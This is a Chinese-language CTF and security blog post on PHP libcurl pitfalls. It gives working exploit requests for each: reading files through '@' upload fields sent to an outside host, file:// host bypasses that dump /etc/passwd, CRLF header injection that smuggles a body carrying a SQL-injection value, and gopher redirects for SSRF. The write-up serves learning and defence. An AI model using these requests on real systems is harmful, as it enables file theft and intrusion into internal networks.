---
title: PHP的libcurl中存在的一些问题
url: 670.html
id: 670
categories:
  - hack_ctf
date: 2017-12-17 20:51:24
tags:
  - php
  - libcurl
  - ctf
---

**未经许可禁止转载**

看了近来的几场ctf题目，学习了一些关于php libcurl的一些知识，在这里总结一下。

<!--more-->
#### 0x1发送POST请求时造成任意文件读取 

PHP manual上对**CURLOPT_POSTFIELDS** 这个选项的描述如下：

![http://pic.wonderkun.cc/uploads/2017/12/1-1.png](http://pic.wonderkun.cc/uploads/2017/12/1-1.png)

也就是说当**CURLOPT_POSTFIELDS**传入的数据是urlencode 的字符串的时候，发出POST请求时的

```
Content-Type: application/x-www-form-urlencoded 
```

这是一个正常的HTML forms应该有的头

当传入的数据是数组的时候，此时发出的POST请求的头是

```
Content-Type: multipart/form-data
```

是一个上传文件需要的头，那么如果传入的数据是array，当**CURL_SAFE_UPLOAD**（PHP5.5.0的时候，次选项默认是false）设置为false的时候，以@开头的value就会被当做文件上传，造成任意文件读取。代码如下：

```php
<?php
$url = $_GET['url'];
$username = isset($_GET['username'])?$_GET['username']:"admin";
$data = array(
    "username"=> $username
);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch,CURLOPT_SAFE_UPLOAD,0);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch,CURLOPT_POSTFIELDS,$data);
$res = curl_exec($ch);
echo $res;
```

请求`http://127.0.0.1:8080/index.php?url=http://wonderkun.cc:9999/&username=@index.php`

就可以获取到`index.php`的内容

![http://pic.wonderkun.cc/uploads/2017/12/2-1.png](http://pic.wonderkun.cc/uploads/2017/12/2-1.png)

#### 0x2 用file协议会忽略host,造成任意文件读取

这里是LCTF的一道题目:

```php
<?php
$url = $_GET['site']; $url_schema = parse_url($url); 
$host = $url_schema['host']; 
$request_url = $url."/";
if ($host !== 'www.baidu.com'){ die("wrong site"); }
$ci = curl_init();
curl_setopt($ci, CURLOPT_URL, $request_url); 
curl_setopt($ci, CURLOPT_RETURNTRANSFER, 1);
 $res = curl_exec($ci); 
curl_close($ci); 
if($res){ echo "<h1>Source Code:</h1>"; echo $request_url; echo "<hr />"; echo htmlentities($res); }
else{ echo "get source failed"; } 
```

这里请求：

```
http://127.0.0.1:8080/index.php?site=file://www.baidu.com/etc/passwd%23
```

就可以造成任意文件读取，但是经过我的测试，这个bug跟libcurl的版本有关

```bash
➜  ~ curl --version
curl 7.54.0 (x86_64-apple-darwin17.0) libcurl/7.54.0 LibreSSL/2.0.20 zlib/1.2.11 nghttp2/1.24.0
Protocols: dict file ftp ftps gopher http https imap imaps ldap ldaps pop3 pop3s rtsp smb smbs smtp smtps telnet tftp
Features: AsynchDNS IPv6 Largefile GSS-API Kerberos SPNEGO NTLM NTLM_WB SSL libz HTTP2 UnixSockets HTTPS-proxy
➜  ~ curl file://www.baidu.com/etc/passwd
curl: (3) Invalid file://hostname/, expected localhost or 127.0.0.1 or none
```

```bash
root@iZwz9g11g0cdei6qd02gjrZ:~# curl --version
curl 7.47.0 (x86_64-pc-linux-gnu) libcurl/7.47.0 GnuTLS/3.4.10 zlib/1.2.8 libidn/1.32 librtmp/2.3
Protocols: dict file ftp ftps gopher http https imap imaps ldap ldaps pop3 pop3s rtmp rtsp smb smbs smtp smtps telnet tftp
Features: AsynchDNS IDN IPv6 Largefile GSS-API Kerberos SPNEGO NTLM NTLM_WB SSL libz TLS-SRP UnixSockets
root@iZwz9g11g0cdei6qd02gjrZ:~# curl file://www.baidu.com/etc/passwd
root:x:0:0:root:/root:/bin/bash
```

具体是哪个版本修复了这个bug，我也没测清楚。

不过`file://localhost/etc/passwd`这种uri是一直被允许的，这就说到了phithon师傅在小密圈中说到的小tips

```php
<?php
$url = $_GET['url'];
$parts = parse_url($url);
if(empty($parts['host']) || $parts['host'] != 'localhost') {
    exit('error');
}
echo file_get_contents($url);
```

请求如下，造成任意文件读取：

```bash
http://127.0.0.1:8080/test.php?url=file://localhost/etc/passwd
# 因为用的是file_get_contents(),只有localhost才可以使用
```

#### 0x3 如果可以控制**CURLOPT_HTTPHEADER**，就造成CRLF漏洞

也许你会问CURLOPT_HTTPHEADER参数本来就可以控制的php的curl发请求时的请求头，那还需要有CRLF漏洞干什么？

其实有了CRLF漏洞，并不是仅仅可以控制请求头那么简单，我们还可以控制POST请求的请求体，甚至可以把原来只是POST数据的请求，修改为POST一个文件。

举个例子：

```php
<?php

$url = $_GET['url'];
$username = isset($_GET['username'])? addslashes($_GET['username']):"admin";
$header = isset($_GET['header'])?array_map("urldecode",$_GET['header']):array();
$data = array(
    "username"=> $username
);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch,CURLOPT_POSTFIELDS,$data);
curl_setopt($ch,CURLOPT_HTTPHEADER,$header);
$res = curl_exec($ch);
echo $res;
```

当请求如下：

```
http://127.0.0.1:8080/index.php?url=http://wonderkun.cc:9999/&header[]=Referer:%20test&username=admin%27
```

![http://pic.wonderkun.cc/uploads/2017/12/3-1.png](http://pic.wonderkun.cc/uploads/2017/12/3-1.png)

可以看到admin已经被转义了，但是我们可以自己注入一个body体，来绕过这种转义：

请求如下

```
http://127.0.0.1:8080/index.php?url=http://wonderkun.cc:9999/&header[]=Content-Length%3A%20400%0d%0aContent-Type%3A%20multipart%2fform-data%3B%20boundary%3D------------------------d467b8408a94bf7d%0d%0a%0d%0a--------------------------d467b8408a94bf7d%0d%0aContent-Disposition%3A%20form-data%3B%20name%3D%22username%22%0d%0a%0d%0aadmin%27%20or%201%3D1%20%23%0d%0a--------------------------d467b8408a94bf7d--%0d%0a&username=admin%27
```

可以看到发送的数据为：

![http://pic.wonderkun.cc/uploads/2017/12/4-1.png](http://pic.wonderkun.cc/uploads/2017/12/4-1.png)

测试一下php是否可以识别这种请求,写个test.php：

```php
<?php
  // filename:test.php
  var_dump($_POST);
```

再来测试一下：

![http://pic.wonderkun.cc/uploads/2017/12/5-1.png](http://pic.wonderkun.cc/uploads/2017/12/5-1.png)

看来通过CRLF注入来来修改请求体是完全可行的。

在[https://github.com/wonderkun/CTF_web/tree/master/web400-5](https://github.com/wonderkun/CTF_web/tree/master/web400-5)这个题目中我就是利用这种技巧，把一个一般的POST类型的SSRF请求修改为一个上传文件的请求，实现攻击内网的任意文件上传漏洞，getshell的。

当然这个题目还有一些别的解法，比如利用302跳转为gopher协议等。

#### 0x4 libcurl的gopher协议支持

<img src="/uploads/2017/12/6-1.png" alt="" width="1818" height="710" class="alignnone size-full wp-image-676" />

libcurl 支持这么多种协议，使其功能非常强大。其中对gopher协议的支持，在SSRF中非常有用。有了gopher协议，就相当于可以把一个http请求转化为任意的TCP连接。

有很多文章都分析了利用gopher协议攻击内网，例如redis，memcache，等服务的payload，这里就不再赘述了。其实gopher协议还可以伪造任意类型的HTTP请求，也就是上面说的那个题利用gopher协议的解法（当时出题的时候以为不能用gopher，十分抱歉）。

思路就是先请求一个外网的地址，返回一个302跳转，302跳转返回头的Location字段设置为一个gopher协议伪造的POST上传文件的请求，请求内网地址，最后getshell。

由于payload比较复杂，只做一个伪造GET请求的例子:

外网的302.php的内容为：

```php
<?php 
  header("Location: gopher://wonderkun.cc:80/_GET%20/index.html/%20HTTP/1.1%0d%0aHost:%20wonderkun.cc%0d%0aContent-Length:%202%0d%0a%0d%0a");
```

访问这个文件，就会发起一个GET请求，到wonderkun.cc的80端口。